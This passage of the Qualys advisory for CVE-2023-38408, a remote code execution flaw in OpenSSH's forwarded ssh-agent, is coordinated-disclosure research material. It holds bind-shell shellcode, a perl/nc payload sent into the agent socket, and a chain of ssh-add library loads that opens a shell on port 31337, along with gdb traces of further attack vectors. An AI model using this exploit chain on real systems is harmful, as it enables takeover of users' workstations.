SHELLCODE=$'\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02\x7a\x69\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54\x5f\x6a\x3b\x58\x0f\x05'

server# (perl -e 'print "\0\0\x27\xbf\x14\0\0\0\x10/usr/lib/modules\0\0\x27\xa6" . "\x90" x 10000'; echo -n
"$SHELLCODE") | nc -U "$SSH_AUTH_SOCK"
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3c/ we remotely alter the mmap layout of ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/pulse-15.0+dfsg1/modules/module-remap-sink.so": agent refused operation

------------------------------------------------------------------------

3d/ we remotely register a SIGBUS handler, and immediately munmap() its
code:

server# ssh-add -s /usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1
Enter passphrase for PKCS#11: whatever
Could not add card "/usr/lib/x86_64-linux-gnu/libgnatcoll_postgres.so.1": agent refused operation

------------------------------------------------------------------------

3e/ we remotely alter the mmap layout of ssh-pkcs11-helper (again), and
replace the unmapped SIGBUS handler's code with another piece of code (a
useful gadget) from another shared library:

server# ssh-add -s /usr/lib/pulse-15.0+dfsg1/modules/module-http-protocol-unix.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/sane/libsane-hp.so.1.0.32
server# ssh-add -s /usr/lib/libreoffice/program/libindex_data.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/gstreamer-1.0/libgstaudiorate.so
server# ssh-add -s /usr/lib/libreoffice/program/libscriptframe.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libisccc-9.16.15-Ubuntu.so
server# ssh-add -s /usr/lib/x86_64-linux-gnu/libxkbregistry.so.0.0.0

------------------------------------------------------------------------

3f/ we remotely raise a SIGBUS in ssh-pkcs11-helper:

server# ssh-add -s /usr/lib/debug/.build-id/15/c0bee6bcb06fbf381d0e0e6c52f71e1d1bd694.debug
Enter passphrase for PKCS#11: whatever
[Press Ctrl-C after a few seconds.]

------------------------------------------------------------------------

3g/ the replacement code (gadget) is executed (instead of the unmapped
SIGBUS handler's code) and jumps to the stack, then into our shellcode,
which binds a shell on TCP port 31337 on Alice's workstation:

server# nc -v workstation 31337
Connection to workstation 31337 port [tcp/*] succeeded!

workstation$ id
uid=1000(alice) gid=1000(alice)
groups=1000(alice),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),122(lpadmin),133(lxd),134(sambashare)

workstation$ ps axuf
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
...
alice        912  0.0  0.0   6060  2312 ?        Ss   17:18   0:00 ssh-agent -s
alice        928  0.0  0.0   2872   956 ?        S    17:25   0:00  \_ [sh]
alice        953  0.0  0.0   7060  3068 ?        R    17:40   0:00      \_ ps axuf

------------------------------------------------------------------------

To get a clear view of the replacement code (the useful gadget) that is
executed instead of the unmapped SIGBUS handler and that jumps into the
NOP sled of our shellcode (in the executable stack), we relaunch our
attack against ssh-agent and attach to ssh-pkcs11-helper with gdb:

workstation$ gdb /usr/lib/openssh/ssh-pkcs11-helper 1225
...
(gdb) continue
Continuing.

Program received signal SIGBUS, Bus error.
memset () at ../sysdeps/x86_64/multiarch/memset-vec-unaligned-erms.S:186

(gdb) stepi
0x00007f2ba9d7c350 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) x/10i 0x00007f2ba9d7c350
=> 0x7f2ba9d7c350:      add    $0x28,%rsp
   0x7f2ba9d7c354:      mov    %r12,%rax
   0x7f2ba9d7c357:      pop    %rbx
   0x7f2ba9d7c358:      pop    %rbp
   0x7f2ba9d7c359:      pop    %r12
   0x7f2ba9d7c35b:      pop    %r13
   0x7f2ba9d7c35d:      pop    %r14
   0x7f2ba9d7c35f:      pop    %r15
   0x7f2ba9d7c361:      ret
   ...

(gdb) stepi
...
0x00007f2ba9d7c361 in ?? () from /usr/lib/libreoffice/program/libuno_cppuhelpergcc3.so.3

(gdb) stepi
0x00007fff7aae5e90 in ?? ()

(gdb) x/10i 0x00007fff7aae5e90
=> 0x7fff7aae5e90:      add    %dl,(%rax)
   0x7fff7aae5e92:      and    %eax,(%rax)
   0x7fff7aae5e94:      add    %al,(%rax)
   0x7fff7aae5e96:      add    %al,(%rax)
   0x7fff7aae5e98:      add    %ah,(%rax)
   0x7fff7aae5e9a:      and    %eax,(%rax)
   0x7fff7aae5e9c:      add    %al,(%rax)
   0x7fff7aae5e9e:      add    %al,(%rax)
   0x7fff7aae5ea0:      call   0x7fff7aae7fbe
   ...

(gdb) stepi
...
0x00007fff7aae5ea0 in ?? ()

(gdb) stepi
0x00007fff7aae7fbe in ?? ()

(gdb) x/10i 0x00007fff7aae7fbe
=> 0x7fff7aae7fbe:      nop
   0x7fff7aae7fbf:      nop
   0x7fff7aae7fc0:      nop
   0x7fff7aae7fc1:      nop
   0x7fff7aae7fc2:      nop
   0x7fff7aae7fc3:      nop
   0x7fff7aae7fc4:      nop
   0x7fff7aae7fc5:      nop
   0x7fff7aae7fc6:      nop
   0x7fff7aae7fc7:      nop

(gdb) !grep stack /proc/1225/maps
7fff7aacb000-7fff7aaeb000 rwxp 00000000 00:00 0                          [stack]

========================================================================
Callback function use-after-free
========================================================================

While analyzing the first results of our fuzzer, we noticed that some
combinations of shared libraries jump to the stack although they do not
register any signal handler or raise any signal; how is this possible?
On investigation, we understood that:

- a core library (for example, libgcrypt.so or libQt5Core.so) is loaded
  but not unloaded (munmap()ed) by dlclose(), because it is marked as
  "nodelete" by the loader;

- a shared library (for example, libgnunetutil.so or gammaray_probe.so)
  is loaded and registers a userland callback function with the core
  library (via gcry_set_allocation_handler() or qtHookData[], for
  example), but it does not deregister this callback function when
  dlclose()d (i.e., when its code is munmap()ed);

- another shared library is loaded (mmap()ed) and replaces the unmapped
  callback function's code with another piece of code (a useful gadget);

- yet another shared library is loaded and calls one of the core
  library's functions, which in turn calls the unmapped callback
  function and therefore executes the replacement code (the useful
  gadget) instead, thus jumping to the stack.

------------------------------------------------------------------------

In the following example, one of the core library's functions is called
at line 66254, the unmapped callback function is called at line 66288,
the replacement code (gadget) is executed instead at line 66289, and
jumps to the stack at line 66293 (ssh-pkcs11-helper segfaults here
because we did not make the stack executable):

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628979
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fff5000d9d0 in ?? ()

(gdb) !grep stack /proc/3628979/maps
7fff4fff3000-7fff50014000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
66254      0x00007f9ae7d82df4:  call   0x7f9ae7d70180 <gcry_mpi_new@plt>
66255      0x00007f9ae7d70180 <gcry_mpi_new@plt+0>:     endbr64
66256      0x00007f9ae7d70184 <gcry_mpi_new@plt+4>:     bnd jmp *0x7aa9d(%rip)        # 0x7f9ae7deac28 <gcry_mpi_new ()
got plt>
66257      0x00007f9af801bbe0 <gcry_mpi_new+0>: endbr64
66258      0x00007f9af801bbe4 <gcry_mpi_new+4>: push   %r12
66259      0x00007f9af801bbe6 <gcry_mpi_new+6>: push   %rbx
66260      0x00007f9af801bbe7 <gcry_mpi_new+7>: lea    0x3f(%rdi),%ebx
66261      0x00007f9af801bbea <gcry_mpi_new+10>:        mov    $0x18,%edi
66262      0x00007f9af801bbef <gcry_mpi_new+15>:        shr    $0x6,%ebx
66263      0x00007f9af801bbf2 <gcry_mpi_new+18>:        sub    $0x8,%rsp
66264      0x00007f9af801bbf6 <gcry_mpi_new+22>:        call   0x7f9af801bb40
66265      0x00007f9af801bb40:  endbr64
...
66285      0x00007f9af809cc60:  mov    0xa8311(%rip),%rax        # 0x7f9af8144f78
66286      0x00007f9af809cc67:  test   %rax,%rax
66287      0x00007f9af809cc6a:  jne    0x7f9af809cc44
66288      0x00007f9af809cc44:  call   *%rax

66289      0x00007f9afc27edc0:  cmp    %eax,%ebx
66290      0x00007f9afc27edc2:  jne    0x7f9afc27f150
66291      0x00007f9afc27f150:  mov    %r14,%rsi
66292      0x00007f9afc27f153:  mov    %r13,%rdi
66293      0x00007f9afc27f156:  call   *%rbx

------------------------------------------------------------------------

In the following example, the unmapped callback function is called at
line 87352, the replacement code (gadget) is executed instead at line
87353, and jumps to the stack at line 87354:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3628993
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffe4fc16d10 in ?? ()

(gdb) !grep stack /proc/3628993/maps
7ffe4fbfc000-7ffe4fc1d000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
87347      0x00007f35f8972d26 <_ZN7QObjectC2ER14QObjectPrivatePS_+182>: lea    0x26acd3(%rip),%rax        #
0x7f35f8bdda00 <qtHookData>
87348      0x00007f35f8972d2d <_ZN7QObjectC2ER14QObjectPrivatePS_+189>: mov    0x18(%rax),%rax
87349      0x00007f35f8972d31 <_ZN7QObjectC2ER14QObjectPrivatePS_+193>: test   %rax,%rax
87350      0x00007f35f8972d34 <_ZN7QObjectC2ER14QObjectPrivatePS_+196>: jne    0x7f35f8972d88
<_ZN7QObjectC2ER14QObjectPrivatePS_+280>
87351      0x00007f35f8972d88 <_ZN7QObjectC2ER14QObjectPrivatePS_+280>: mov    %rbx,%rdi
87352      0x00007f35f8972d8b <_ZN7QObjectC2ER14QObjectPrivatePS_+283>: call   *%rax

87353      0x00007f35fa445130 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+80>:     pop    %rbp
87354      0x00007f35fa445131 <_ZN5KAuth15ObjectDecorator13setAuthActionERKNS_6ActionE+81>:     ret

------------------------------------------------------------------------

Note: several shared libraries that are installed by default on Ubuntu
Desktop (for example, gkm-*-store-standalone.so) do not have constructor
or destructor functions, but they are actual PKCS#11 providers, so some
of their functions are explicitly called by ssh-pkcs11-helper, and these
functions register a callback function with libgcrypt.so but they do not
deregister it when dlclose()d (i.e., when munmap()ed), thus exhibiting
the "Callback function use-after-free" behavior presented in this
subsection.

In the following example, one of libgcrypt.so's functions is called at
line 79114, the unmapped callback function is called at line 79143, the
replacement code (gadget) is executed instead at line 79144, and jumps
to the stack at line 79157:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3629085
...
(gdb) record btrace
(gdb) continue
Continuing.

Thread 1 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
0x00007fffb2735c48 in ?? ()

(gdb) !grep stack /proc/3629085/maps
7fffb2716000-7fffb2737000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
79114      0x00007f8328147e3a:  call   0x7f8328135500 <gcry_mpi_scan@plt>
79115      0x00007f8328135500 <gcry_mpi_scan@plt+0>:    endbr64
79116      0x00007f8328135504 <gcry_mpi_scan@plt+4>:    bnd jmp *0x7a8dd(%rip)        # 0x7f83281afde8 <gcry_mpi_scan
() got plt>
79117      0x00007f832e2b1220 <gcry_mpi_scan+0>:        endbr64
79118      0x00007f832e2b1224 <gcry_mpi_scan+4>:        sub    $0x8,%rsp
79119      0x00007f832e2b1228 <gcry_mpi_scan+8>:        call   0x7f832e32fbb0
79120      0x00007f832e32fbb0:  endbr64
...
79140      0x00007f832e2b436e:  mov    0x129dc3(%rip),%rax        # 0x7f832e3de138
79141      0x00007f832e2b4375:  test   %rax,%rax
79142      0x00007f832e2b4378:  je     0x7f832e2b43b0
79143      0x00007f832e2b437a:  jmp    *%rax

79144      0x00007f832ed274f0:  and    $0x20,%al
79145      0x00007f832ed274f2:  mov    %rax,0x50(%rsp)
79146      0x00007f832ed274f7:  mov    0x30(%rsp),%r13d
79147      0x00007f832ed274fc:  mov    0x58(%rsp),%r15
79148      0x00007f832ed27501:  mov    %ebx,%ebp
79149      0x00007f832ed27503:  mov    %r8d,%edx
79150      0x00007f832ed27506:  mov    0x50(%rsp),%rsi
79151      0x00007f832ed2750b:  mov    0x28(%rsp),%r14
79152      0x00007f832ed27510:  movslq 0x38(%r12),%rax
79153      0x00007f832ed27515:  sub    $0x8000,%ebp
79154      0x00007f832ed2751b:  mov    0x54(%r12),%ecx
79155      0x00007f832ed27520:  add    %rax,%r14
79156      0x00007f832ed27523:  mov    %r14,%rdi
79157      0x00007f832ed27526:  call   *%r15

========================================================================
Return from syscall use-after-free
========================================================================

While analyzing the strace logs of the dlopen() and dlclose() of every
shared library in /usr/lib*, we spotted an unusual SIGSEGV:

- a shared library is loaded, and its constructor function starts a
  thread that sleeps for 10 seconds in kernel-land:

------------------------------------------------------------------------
3631347 openat(AT_FDCWD, "/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so", O_RDONLY|O_CLOEXEC) = 3
...
3631347 mmap(NULL, 33296, PROT_READ, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0x7f5f3c3fb000
3631347 mmap(0x7f5f3c3fd000, 12288, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x2000) =
0x7f5f3c3fd000
3631347 mmap(0x7f5f3c400000, 8192, PROT_READ, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x5000) = 0x7f5f3c400000
3631347 mmap(0x7f5f3c402000, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x6000) =
0x7f5f3c402000
3631347 close(3)                        = 0
...
3631347
clone3({flags=CLONE_VM|CLONE_FS|CLONE_FILES|CLONE_SIGHAND|CLONE_THREAD|CLONE_SYSVSEM|CLONE_SETTLS|CLONE_PARENT_SETTID|CLONE_CHILD_CLEARTID,
 child_tid=0x7f5f3bd70910, parent_tid=0x7f5f3bd70910, exit_signal=0, stack=0x7f5f3b570000, stack_size=0x7fff00,
tls=0x7f5f3bd70640} => {parent_tid=[3631372]}, 88) = 3631372
...
3631372 clock_nanosleep(CLOCK_REALTIME, 0, {tv_sec=10, tv_nsec=0},  <unfinished ...>
------------------------------------------------------------------------

- meanwhile, the main thread (ssh-pkcs11-helper) unloads this shared
  library (because it is not an actual PKCS#11 provider) and therefore
  munmap()s the code where the sleeping thread should return to after
  its sleep in kernel-land:

------------------------------------------------------------------------
3631347 socket(AF_UNIX, SOCK_DGRAM|SOCK_CLOEXEC, 0) = 3
3631347 connect(3, {sa_family=AF_UNIX, sun_path="/dev/log"}, 110) = 0
3631347 sendto(3, "<35>Jun 22 18:35:25 ssh-pkcs11-helper[3631347]: error: dlsym(C_GetFunctionList) failed:
/usr/lib/x86_64-linux-gnu/cmpi/libcmpiOSBase_ProcessorProvider.so: undefined symbol: C_GetFunctionList", 190,
MSG_NOSIGNAL, NULL, 0) = 190
3631347 close(3)                        = 0
3631347 munmap(0x7f5f3c3fb000, 33296)   = 0
------------------------------------------------------------------------

- the sleeping thread returns from kernel-land and crashes with a
  SIGSEGV because its userland code (at 0x7f5f3c3fecff) was unmapped:

------------------------------------------------------------------------
3631372 <... clock_nanosleep resumed>0x7f5f3bd6fde0) = 0
3631372 --- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x7f5f3c3fecff} ---
------------------------------------------------------------------------

Of course, we can request ssh-pkcs11-helper to load (mmap()) a
"nodelete" library before the sleeping thread returns from kernel-land,
thus replacing the unmapped userland code with another piece of code (a
hopefully useful gadget). In the following example, the sleeping thread
returns from kernel-land after line 214, executes the replacement code
(gadget) at line 256, and jumps to the stack at line 1305:

Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3631531
...
(gdb) record btrace
(gdb) continue
Continuing.
...
Thread 2 "ssh-pkcs11-help" received signal SIGSEGV, Segmentation fault.
[Switching to Thread 0x7f4603960640 (LWP 3631561)]
0x00007ffe2196f180 in ?? ()

(gdb) !grep stack /proc/3631531/maps
7ffe21955000-7ffe21976000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size unlimited
(gdb) record instruction-history
...
214        0x00007f4604b71866 <__GI___clock_nanosleep+198>:     syscall
...
240        0x00007f4604b71831 <__GI___clock_nanosleep+145>:     ret
...
244        0x00007f4604b766ef <__GI___nanosleep+31>:    ret
...
255        0x00007f4604b7663d <__sleep+93>:     ret

256        0x00007f46050fecff:  jmp    0x7f4604662e54 <__ieee754_j1f128+2276>
257        0x00007f4604662e54 <__ieee754_j1f128+2276>:  movq   0x60(%rsp),%mm3
...
1304       0x00007f460466285b <__ieee754_j1f128+747>:   add    $0xc8,%rsp
1305       0x00007f4604662862 <__ieee754_j1f128+754>:   ret

========================================================================
Sigaltstack use-after-free
========================================================================

```
> ```
> From time to time, we noticed the following warning in the dmesg of our
>
> ```

```
fuzzing laptop:

------------------------------------------------------------------------
[585902.691238] signal: ssh-pkcs11-help[1663008] overflowed sigaltstack
------------------------------------------------------------------------

On investigation, we discovered that at least one shared library
(libgnatcoll_postgres.so) calls sigaltstack() to register an alternate
signal stack (used by SA_ONSTACK signal handlers) when dlopen()ed, and
then munmap()s this signal stack without deregistering it (SS_DISABLE)
when dlclose()d. Consequently, we implemented and tested a different
attack idea:

- we randomly load zero or more shared libraries that permanently alter
  the mmap layout;

- we load libgnatcoll_postgres.so, which registers an alternate signal
  stack and then munmap()s it without deregistering it;

- we randomly load zero or more shared libraries that alter the mmap
  layout (again), and hopefully replace the unmapped signal stack with
  another writable memory mapping (for example, a thread stack, or a
  .data or .bss segment);

- we randomly load one shared library that registers an SA_ONSTACK
  signal handler but does not munmap() its code when dlclose()d (unlike
  our original "Signal handler use-after-free" attack);

- we randomly load one shared library that raises this signal and
  therefore calls the SA_ONSTACK signal handler, thus overwriting the
  replacement memory mapping with stack frames from the signal handler;

- we randomly load one or more shared libraries that hopefully use the
  overwritten contents of the replacement memory mapping.

Although we successfully found various combinations of shared libraries
that overwrite a .data or .bss segment with a stack frame from a signal
handler, we failed to overwrite a useful memory mapping with useful data
(e.g., we failed to magically jump to the stack); for this attack to
work, more research and a finer-grained approach might be required.

========================================================================
Sigreturn to arbitrary instruction pointer
========================================================================

Astonishingly, numerous combinations of shared libraries crash because
they try to execute code at 0xcccccccccccccccc: a direct control of the
instruction pointer (RIP), because these 0xcc bytes come from the stack
buffer of ssh-pkcs11-helper that we (remote attackers) filled with 0xcc
bytes.

Initially, we got very excited by this new attack vector, because we
thought that a gadget of the form "add rsp, N; ret" was executed, thus
moving the stack pointer (RSP) into our 0xcc-filled stack buffer and
popping RIP from there. Unfortunately, the reality is more complex:

- a shared library raises a signal (a SIGSEGV in the example below, at
  line 134110) and, in consequence of a "Signal handler use-after-free",
  a replacement gadget of the form "ret N" is executed instead of the
  signal handler (at line 134111);

- exactly as the real signal handler would, the replacement gadget
  returns to the glibc's restore_rt() function (at line 134112), which
  in turn calls the kernel's rt_sigreturn() function (at line 134113);

- however, before the kernel's rt_sigreturn() function is called, the
  replacement gadget "ret N" moves RSP into our 0xcc-filled stack buffer
  and as a result, the kernel's rt_sigreturn() function restores all
  userland registers (including RIP and RSP) from there;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3633914
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007fcd468671b1 in xtables_register_target () from /lib/x86_64-linux-gnu/libxtables.so.12

(gdb) x/i 0x00007fcd468671b1
=> 0x7fcd468671b1 <xtables_register_target+209>:        movzbl 0x18(%rax),%eax

(gdb) info registers
rax            0x0                 0
...

(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0xcccccccccccccccc in ?? ()

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
134106     0x00007fcd4686719e <xtables_register_target+190>:    mov    0x6e1b(%rip),%rax        # 0x7fcd4686dfc0
134107     0x00007fcd468671a5 <xtables_register_target+197>:    movzwl 0x22(%rbx),%edx
134108     0x00007fcd468671a9 <xtables_register_target+201>:    mov    (%rax),%rax
134109     0x00007fcd468671ac <xtables_register_target+204>:    mov    %dx,0x6(%rsp)
134110  [disabled]
134111     0x00007fcd48e434a0:  ret    $0x1f0f
134112     0x00007fcd49655520 <__restore_rt+0>: mov    $0xf,%rax
134113     0x00007fcd49655527 <__restore_rt+7>: syscall

(gdb) info registers
rax            0x0                 0
rbx            0xcccccccccccccccc  -3689348814741910324
rcx            0xcccccccccccccccc  -3689348814741910324
rdx            0xcccccccccccccccc  -3689348814741910324
rsi            0xcccccccccccccccc  -3689348814741910324
rdi            0xcccccccccccccccc  -3689348814741910324
rbp            0xcccccccccccccccc  0xcccccccccccccccc
rsp            0xcccccccccccccccc  0xcccccccccccccccc
r8             0xcccccccccccccccc  -3689348814741910324
r9             0xcccccccccccccccc  -3689348814741910324
r10            0xcccccccccccccccc  -3689348814741910324
r11            0xcccccccccccccccc  -3689348814741910324
r12            0xcccccccccccccccc  -3689348814741910324
r13            0xcccccccccccccccc  -3689348814741910324
r14            0xcccccccccccccccc  -3689348814741910324
r15            0xcccccccccccccccc  -3689348814741910324
rip            0xcccccccccccccccc  0xcccccccccccccccc
------------------------------------------------------------------------

Although we directly control all of the userland registers, we failed to
transform this attack vector into a one-shot remote exploit, because RSP
(which was conveniently pointing into our 0xcc-filled stack buffer) gets
overwritten, and because we were unable to leak any information from
ssh-pkcs11-helper (to defeat ASLR).

Partially overwriting a pointer that is left over in ssh-pkcs11-helper's
stack buffer, and that is later used by rt_sigreturn() to restore a
userland register, might be an interesting idea that we have not
explored yet.

========================================================================
_Unwind_Context type-confusion
========================================================================

This attack vector was the most puzzling of our discoveries: from time
to time, some combinations of shared libraries jumped to the stack, but
evidently not as a result of a signal handler, callback function, or
return from syscall use-after-free. Eventually, we determined the
sequence of events that led to these stack jumps:

- some shared libraries load LLVM's libunwind.so as a "nodelete" library
  (i.e., it is never unloaded, even after dlclose());

- some shared libraries throw a C++ exception, which loads GCC's
  libgcc_s.so and calls the _Unwind_GetCFA() function (at line 57295 in
  the example below);

- however, GCC's libgcc_s.so mistakenly calls LLVM's _Unwind_GetCFA()
  (at line 57298) instead of GCC's _Unwind_GetCFA() (because LLVM's
  libunwind.so was loaded first), and passes a pointer to GCC's struct
  _Unwind_Context to this function (instead of a pointer to LLVM's
  struct _Unwind_Context, which is a different type of structure);

- LLVM's _Unwind_GetCFA() then calls its unw_get_reg() function (at line
  57303), which in turn calls a function pointer (at line 57311) that is
  a member of LLVM's struct _Unwind_Context, but that happens to be a
  stack pointer in GCC's struct _Unwind_Context;

------------------------------------------------------------------------
Attaching to program: /usr/lib/openssh/ssh-pkcs11-helper, process 3635541
...
(gdb) record btrace
(gdb) continue
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x00007ffcf5e9be10 in ?? ()

(gdb) !grep stack /proc/3635541/maps
7ffcf5e82000-7ffcf5ea3000 rw-p 00000000 00:00 0                          [stack]

(gdb) set record instruction-history-size 100
(gdb) record instruction-history
...
57295      0x00007f7c8eaaccf1:  call   0x7f7c8ea99470 <_Unwind_GetCFA@plt>

57296      0x00007f7c8ea99470 <_Unwind_GetCFA@plt+0>:   endbr64
57297      0x00007f7c8ea99474 <_Unwind_GetCFA@plt+4>:   bnd jmp *0x1bc2d(%rip)        # 0x7f7c8eab50a8 <_Unwind_GetCFA
() got plt>

57298      0x00007f7c8edce920 <_Unwind_GetCFA+0>:       sub    $0x18,%rsp
57299      0x00007f7c8edce924 <_Unwind_GetCFA+4>:       mov    %fs:0x28,%rax
57300      0x00007f7c8edce92d <_Unwind_GetCFA+13>:      mov    %rax,0x10(%rsp)
57301      0x00007f7c8edce932 <_Unwind_GetCFA+18>:      lea    0x8(%rsp),%rdx
57302      0x00007f7c8edce937 <_Unwind_GetCFA+23>:      mov    $0xfffffffe,%esi
57303      0x00007f7c8edce93c <_Unwind_GetCFA+28>:      call   0x7f7c8edca6b0 <unw_get_reg>

57304      0x00007f7c8edca6b0 <unw_get_reg+0>:  push   %rbp
57305      0x00007f7c8edca6b1 <unw_get_reg+1>:  push   %r14
57306      0x00007f7c8edca6b3 <unw_get_reg+3>:  push   %rbx
57307      0x00007f7c8edca6b4 <unw_get_reg+4>:  mov    %rdx,%r14
57308      0x00007f7c8edca6b7 <unw_get_reg+7>:  mov    %esi,%ebp
57309      0x00007f7c8edca6b9 <unw_get_reg+9>:  mov    %rdi,%rbx
57310      0x00007f7c8edca6bc <unw_get_reg+12>: mov    (%rdi),%rax
57311      0x00007f7c8edca6bf <unw_get_reg+15>: call   *0x10(%rax)

(gdb) !grep 7f7c8ea /proc/3635541/maps
7f7c8ea99000-7f7c8eab0000 r-xp 00003000 08:03 8788336                    /usr/lib/x86_64-linux-gnu/libgcc_s.so.1

(gdb) !grep 7f7c8ed /proc/3635541/maps
7f7c8edc9000-7f7c8edd1000 r-xp 00000000 08:03 11148811                   /usr/lib/llvm-14/lib/libunwind.so.1.0
------------------------------------------------------------------------

========================================================================
RCE in library constructor
========================================================================

As a last and extreme example of a remote attack against ssh-agent
forwarding, we noticed that one shared library's constructor function
(which can be invoked by a remote attacker via an ssh-agent forwarding)
starts a server thread that listens on a TCP port, and we discovered a
remotely exploitable vulnerability (a heap-based buffer overflow) in
this server's implementation.

The unusual malloc exploitation technique that we used to remotely
exploit this vulnerability is so interesting (it is reliable, one-shot,
and works against the latest glibc versions, despite all the modern
protections) that we decided to publish it in a separate advisory:

    <https://www.qualys.com/2023/06/06/renderdoc/renderdoc.txt>

This last and extreme attack vector against ssh-agent also underlines
the central point of this advisory: many shared libraries are simply not
safe to be loaded (and unloaded) in a security-sensitive program such as
ssh-agent.

========================================================================
Discussion
========================================================================

We believe that we have not exploited the full potential of this
"dlopen() then dlclose()" primitive:

- we have only investigated Ubuntu Desktop 22.04 and 21.10, but other
  versions, distributions, or operating systems might be hiding further
  surprises;

- our rudimentary fuzzer can certainly be greatly improved, and has
  definitely not tried all the combinations of shared libraries and side
  effects;

- we have identified seven attack vectors against ssh-agent (described
  in the "Results" section), but we have not analyzed in detail all the
  results of our fuzzer;

- we have not fully explored various aspects of these attack vectors:

  - it might be possible to reliably exploit the "Sigaltstack
    use-after-free" (by carefully overwriting the .data or .bss segment
    of a shared library) or the "Sigreturn to arbitrary instruction
    pointer" (by partially overwriting a leftover pointer in
    ssh-pkcs11-helper's stack);

  - we currently store our shellcode in ssh-pkcs11-helper's main() stack
    buffer only, but it might be possible to store shellcode in other
    stack buffers as well, or somehow spray the stack with shellcode,
    which would dramatically increase our chances of jumping into our
    shellcode;

    for example, we tried to spray the stack with shellcode by
    interrupting a memcpy() of controlled data with a signal handler,
    thereby spilling controlled YMM registers to the stack (inspired by
    <https://bugs.chromium.org/p/project-zero/issues/detail?id=2266>), but
    we failed because we can memcpy() only ~10KB of data, and because we
    cannot remotely use tricks such as inotify or sched*() to precisely
    time this race;

  - it might be possible to control the mmap layout of ssh-pkcs11-helper
    with page precision (which would allow us to precisely control the
    gadget that replaces the unmapped signal handler, callback function,
    or return from syscall), but we failed to find large malloc()ations
    (which are mmap()ed) in ssh-pkcs11-helper (the only way we found to
    influence the mmap layout is to load and unload shared libraries, as
    mentioned in Step 4a/ of the "Experiments" section);

  - instead of replacing the unmapped signal handler or callback
    function (or return from syscall) with a gadget from another shared
    library, it is perfectly possible to replace it with an executable
    thread stack (made executable by loading an "execstack" library),
    but we have failed so far to control the contents of such a thread
    stack.

========================================================================
Acknowledgments
========================================================================

We thank the OpenSSH developers, and Damien Miller in particular, for
their outstanding work on this vulnerability and on OpenSSH in general.
We also thank Mitre's CVE Assignment Team for their quick response.
Finally, we dedicate this advisory to the Midnight Fox.

========================================================================
Timeline
========================================================================

2023-07-06: We sent a draft of our advisory and a preliminary patch to
the OpenSSH developers.

2023-07-07: The OpenSSH developers replied and sent us a more complete
set of patches.

2023-07-09: We sent feedback about these patches to the OpenSSH
developers.

2023-07-11: The OpenSSH developers sent us a complete set of patches,
and we sent them feedback about these patches.

2023-07-14: The OpenSSH developers informed us that "we're aiming to
make a security-only release ... on July 19th."

2023-07-19: Coordinated release.
_______________________________________________
Sent through the Full Disclosure mailing list
<https://nmap.org/mailman/listinfo/fulldisclosure>
Web Archives & RSS: <https://seclists.org/fulldisclosure/>

```

---

[![Previous](/images/left-icon-16x16.png)](30)
[By Date](date.html#31)
[![Next](/images/right-icon-16x16.png)](32)

[![Previous](/images/left-icon-16x16.png)](30)
[By Thread](index.html#31)
[![Next](/images/right-icon-16x16.png)](33)

### Current thread:

* **CVE-2023-38408: Remote Code Execution in OpenSSH's forwarded ssh-agent** *Qualys Security Advisory via Fulldisclosure (Jul 19)*

![](/shared/images/nst-icons.svg#search)

## [Nmap Security Scanner](https://nmap.org/)

